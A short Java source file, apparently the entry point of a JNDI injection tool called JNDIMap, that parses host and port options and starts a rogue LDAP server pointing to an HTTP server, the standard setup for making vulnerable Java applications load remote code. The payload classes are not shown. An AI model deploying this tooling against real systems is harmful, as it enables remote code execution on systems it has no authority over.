package com.example.exploit;

import com.example.exploit.server.WebServer;
import com.example.exploit.server.LdapServer;

public class Main {

    public static void main(String[] args) {

        if (args.length == 0) {
            System.out.println("Usage: java -jar JNDIMap.jar -i <ldapHost> -r <httpHost> -l <ldapPort> -p <httpPort>");
            return;
        }

        String ldapHost = "0.0.0.0";
        String httpHost = "127.0.0.1";
        int ldapPort = 1389;
        int httpPort = 3456;

        for (int i = 0; i < args.length; i ++ ) {
            switch (args[i]) {
                case "-i":
                    ldapHost = args[i + 1];
                    break;
                case "-r":
                    httpHost = args[i + 1];
                    break;
                case "-l":
                    ldapPort = Integer.parseInt(args[i + 1]);
                    break;
                case "-p":
                    httpPort = Integer.parseInt(args[i + 1]);
                    break;
            }
        }

        WebServer httpServer = new WebServer(httpHost, httpPort);
        LdapServer ldapServer = new LdapServer(ldapHost, ldapPort, httpHost + ":" + httpPort);

        Thread httpThread = new Thread(httpServer);
        Thread ldapThread = new Thread(ldapServer);

        httpThread.start();
        ldapThread.start();
    }
}
